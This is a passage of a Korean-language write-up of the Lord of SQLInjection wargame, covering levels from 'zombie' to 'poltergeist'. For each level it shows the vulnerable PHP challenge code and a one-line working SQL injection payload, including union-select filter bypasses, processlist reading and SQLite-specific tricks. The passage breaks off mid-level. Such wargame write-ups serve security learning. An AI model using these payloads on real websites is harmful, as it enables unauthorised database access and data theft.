class="subst">&#123;$result[pw]&#125;</span>&lt;/h2&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] === <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;zombie&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>mysql 에서 실행중인 쿼리는 information_schema의 processlist 에 기록됩니다.<br>이를 활용하여 다른 사용자들이 실행시킨 쿼리 문을 알아내는 mitm sql injection이라는 기법도 존재하는데, 그 주제로 정도원님이 발표하신 자료가 있어 링크로 걸어 두겠습니다.</p><blockquote><p>웹해킹이라고 무시하는 것들 보소</p><p><a target="_blank" rel="noopener" href="http://secuinside.com/archive/2017/2017-1-2.pdf">http://secuinside.com/archive/2017/2017-1-2.pdf</a></p></blockquote><p>processlist 에서 실행중인 쿼리를 가져와 적절히 substring 범위를 지정해 주면 해결됩니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : pw=&#x27;union select mid(info,38,66) from information_schema.processlist#</span><br></pre></td></tr></table></figure><h3 id="32-alien"><a href="#32-alien" class="headerlink" title="32. alien"></a>32. alien</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>();</span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">dbconnect</span>();</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/admin|and|or|if|coalesce|case|_|\.|prob|time/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;no&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_alien where no=<span class="subst">&#123;$_GET[no]&#125;</span>&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="variable">$query2</span> = <span class="string">&quot;select id from prob_alien where no=&#x27;<span class="subst">&#123;$_GET[no]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query2 : &lt;strong&gt;<span class="subst">&#123;$query2&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;no&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$r</span>[<span class="string">&#x27;id&#x27;</span>] !== <span class="string">&quot;admin&quot;</span>) <span class="keyword">exit</span>(<span class="string">&quot;sandbox1&quot;</span>);</span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$r</span>[<span class="string">&#x27;id&#x27;</span>] === <span class="string">&quot;admin&quot;</span>) <span class="keyword">exit</span>(<span class="string">&quot;sandbox2&quot;</span>);</span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query2</span>));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$r</span>[<span class="string">&#x27;id&#x27;</span>] === <span class="string">&quot;admin&quot;</span>) <span class="keyword">exit</span>(<span class="string">&quot;sandbox&quot;</span>);</span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query2</span>));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$r</span>[<span class="string">&#x27;id&#x27;</span>] === <span class="string">&quot;admin&quot;</span>) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;alien&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>4개의 비교식을 통과하는 것이 목표인데<br>동일한 쿼리에서 다른 값을 반환해야 하는 것이 첫번째 조건이고<br>싱글쿼트 처리가 된 쿼리에서도 동일하게 작동하는 것이 두번째 조건입니다.</p><p>#을 넣었을때 싱글쿼트 안에서는 문자열로 취급되고<br>밖에서는 일반 구문으로 해석된다는 점을 이용하면<br>문제를 해결할 수 있습니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : no=0#&#x27; union select concat(char(now()%2+96),&quot;dmin&quot;) id%0aunion select concat(char(now()%2-sleep(1)+97),&quot;dmin&quot;) id limit 1#</span><br></pre></td></tr></table></figure><h3 id="33-cthulhu"><a href="#33-cthulhu" class="headerlink" title="33. cthulhu"></a>33. cthulhu</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./welcome.php&quot;</span>;</span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>();</span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">dbconnect</span>();</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/prob|_|\.|\(\)|admin/i&#x27;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/prob|_|\.|\(\)|admin/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_cthulhu where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;cthulhu&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>최소한의 mod security 설정이 적용된 문제입니다.<br>괄호나 특수문자, SQL 구문 등을 기반으로 필터링되는데<br>이것저것 시도하다보면 어렵지 않게 답을 찾을 수 있습니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : id=\&amp;pw=||1#</span><br></pre></td></tr></table></figure><h3 id="34-death"><a href="#34-death" class="headerlink" title="34. death"></a>34. death</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>();</span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">dbconnect</span>();</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/prob|_|\.|\(\)|admin/i&#x27;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/prob|_|\.|\(\)|admin/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_death where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27; and pw=md5(&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;)&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;death&quot;</span>);</span><br><span class="line">  <span class="keyword">elseif</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[&#x27;id&#x27;]&#125;</span>&lt;br&gt;You are not admin :(&lt;/h2&gt;&quot;</span>; </span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>이전 문제와 동일하지만 guest 계정이 존재하므로 조건식, limit, order by 등을 사용해주면 되겠습니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Solution1 : id=\&amp;pw=||1 limit 1,1#</span><br><span class="line">Solution2 : id=\&amp;pw=||id=0x61646d696e#</span><br></pre></td></tr></table></figure><h3 id="35-godzilla"><a href="#35-godzilla" class="headerlink" title="35. godzilla"></a>35. godzilla</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>();</span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">dbconnect</span>();</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_godzilla where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello admin&lt;/h2&gt;&quot;</span>;</span><br><span class="line">   </span><br><span class="line">  <span class="variable">$_GET</span>[pw] = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[pw]);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select pw from prob_godzilla where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;godzilla&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>‘%’는 필터링되지만 rlike 를 사용하거나 hex 인코딩을 통해 우회할 수 있습니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Solution1 : id=\&amp;pw=||pw rlike &#x27;^a&#x27;#</span><br><span class="line">Solution2 : id=\&amp;pw=||pw like 0x25#</span><br></pre></td></tr></table></figure><h3 id="36-cyclops"><a href="#36-cyclops" class="headerlink" title="36. cyclops"></a>36. cyclops</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>();</span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">dbconnect</span>();</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id,pw from prob_cyclops where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="variable">$result</span> = @<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] === <span class="string">&quot;first&quot;</span>) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] === <span class="string">&quot;second&quot;</span>)) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;cyclops&quot;</span>);<span class="comment">//must use union select</span></span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>테이블에 데이터가 없으므로 union 구문을 이용해야 합니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : id=\&amp;pw=union/**/select/**/0x6669727374 x,0x7365636f6e64#</span><br></pre></td></tr></table></figure><h3 id="37-chupacabra"><a href="#37-chupacabra" class="headerlink" title="37. chupacabra"></a>37. chupacabra</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>();</span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">sqlite_open</span>(<span class="string">&quot;./db/chupacabra.db&quot;</span>);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from member where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="variable">$result</span> = <span class="title function_ invoke__">sqlite_fetch_array</span>(<span class="title function_ invoke__">sqlite_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&quot;admin&quot;</span>) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;chupacabra&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>sqlite 인젝션 문제입니다. 쿼리 문법에 있어서는 mysql 과 유사한 점이 많지만 sqlite에서는 #을 주석용법으로 사용하지 않는다는 점만은 기억해둡시다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : id=1&amp;pw=&#x27;union select&quot;admin&quot;--</span><br></pre></td></tr></table></figure><h3 id="38-manticore"><a href="#38-manticore" class="headerlink" title="38. manticore"></a>38. manticore</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>();</span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">sqlite_open</span>(<span class="string">&quot;./db/manticore.db&quot;</span>);</span><br><span class="line">  <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">  <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>] = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>]);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from member where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="variable">$result</span> = <span class="title function_ invoke__">sqlite_fetch_array</span>(<span class="title function_ invoke__">sqlite_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&quot;admin&quot;</span>) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;manticore&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>실제 데이터가 없으므로 union 구문을 이용해야 합니다.<br>addslashes 함수의 영향으로 싱글쿼트 앞에 백슬래시가 붙지만 sqlite 에서는 mysql 과 다르게 쿼트 앞에 백슬래시가 붙어도 구문으로서 해석합니다.<br>char 함수를 통해 문자를 만들고 ||으로 결합해서 사용하면 되겠습니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : id=&amp;pw=&#x27; and 0 union select (char(0x61)||char(0x64)||char(0x6d)||char(0x69)||char(0x6e))--</span><br></pre></td></tr></table></figure><h3 id="39-banshee"><a href="#39-banshee" class="headerlink" title="39. banshee"></a>39. banshee</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>();</span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">sqlite_open</span>(<span class="string">&quot;./db/banshee.db&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/sqlite|member|_/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from member where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="variable">$result</span> = <span class="title function_ invoke__">sqlite_fetch_array</span>(<span class="title function_ invoke__">sqlite_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;login success!&lt;/h2&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select pw from member where id=&#x27;admin&#x27;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = <span class="title function_ invoke__">sqlite_fetch_array</span>(<span class="title function_ invoke__">sqlite_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] === <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>]) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;banshee&quot;</span>); </span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>sqlite에서는 mysql과 다르게 &amp;&amp;, ||을 사용할 수 없다는 점만 알고 넘어갑시다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : pw=&#x27; or id=&quot;admin&quot; and pw like &#x27;&lt;BRUTE_HERE&gt;%&#x27;--</span><br></pre></td></tr></table></figure><h3 id="40-poltergeist"><a href="#40-poltergeist" class="headerlink" title="40. poltergeist"></a>40. poltergeist</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>();</span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">sqlite_open</span>(<span class="string">&quot;./db/poltergeist.db&quot;</span>);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from member where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="variable">$result</span> = <span class="title function_ invoke__">sqlite_fetch_array</span>(<span class="title function_ invoke__">sqlite_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[&#x27;id&#x27;]&#125;</span>&lt;/h2&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$poltergeistFlag</span> === <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>]) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;poltergeist&quot;</span>);<span class="comment">// Flag is in `flag_&#123;$hash&#125;` table, not in `member` table. Let&#x27;s look over whole of the database.</span></span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>sqlite에서는 select tbl_name from sqlite_master 쿼리를 통해 모든 테이블명을 조회할 수 있습니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td 